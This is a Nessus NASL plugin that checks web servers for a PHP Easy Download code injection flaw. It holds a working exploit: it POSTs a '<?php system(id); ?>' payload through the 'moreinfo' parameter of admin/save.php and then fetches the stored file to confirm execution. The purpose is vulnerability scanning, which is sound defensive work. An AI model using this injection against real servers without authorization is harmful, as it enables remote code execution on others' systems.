#	
#	This script was written by Justin Seitz	<jms@bughunter.ca>
#	Per Justin : GPLv2
#

include("compat.inc");

if(description)
{
  script_id(23774);
  script_version("$Revision: 1.11 $");
  script_bugtraq_id(21179);
  script_xref(name:"milw0rm", value:"2812");
  script_xref(name:"milw0rm", value:"6770");
  script_xref(name:"OSVDB", value:"30525");
  script_xref(name:"Secunia", value:"23002");
  script_name(english: "PHP Easy Download admin/save.php moreinfo Parameter Code Injection");
  script_summary(english: "Tries to inject PHP code into remote web server");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote code execution issue." );
  script_set_attribute(attribute:"description", value:
"The version of PHP Easy Download installed on the remote host fails to
sanitize input to the 'moreinfo' parameter before using it in the
'save.php' script.  By sending a specially-crafted value, an attacker
can store and execute code at the privilege level of the remote web
server." );
  script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2812" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.5 or later as that version is reportedly not
affected." );
  script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english: "This script is Copyright (C) 2006-2009 Justin Seitz");
  script_family(english: "CGI abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}



include("global_settings.inc");
include("http_func.inc"); 	 
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

if (thorough_tests)
 dirs = list_uniq(make_list("/easydownload","/phpeasydownload","/download", cgi_dirs()));
else
 dirs = make_list(cgi_dirs());

# Craft the PHP code to inject, we are going to execute the bash id command.

filename = strcat(rand_str(charset: "abcdefghijklmnopqrstuvwxyz", length: 6), "-", rand(),".php");
cmd = "id";
code = urlencode(str: strcat('<?php system(', cmd, "); ?>"));

foreach dir (dirs)
{
  url = strcat(dir, "/file_info/admin/save.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if ("# of Accesses:" >< res) {
   data = string("description=0&moreinfo=",code,"&accesses=0&filename=",filename,"&date=&B1=Submit");
   attackreq = http_post(port:port, item:url, data:data);
   attackreq = ereg_replace(string:attackreq, pattern:"Content-Length: ", replace: string("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: "));
   attackres = http_keepalive_send_recv(port:port,data:attackreq,bodyonly:TRUE);
   if (attackres == NULL) exit(0);

    # Check the file we just uploaded for our random string we generated.
    http_check_remote_code(
      unique_dir:dir,
      check_request: strcat("/file_info/descriptions/",filename,".0"),
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      port:port
    );
  }
}
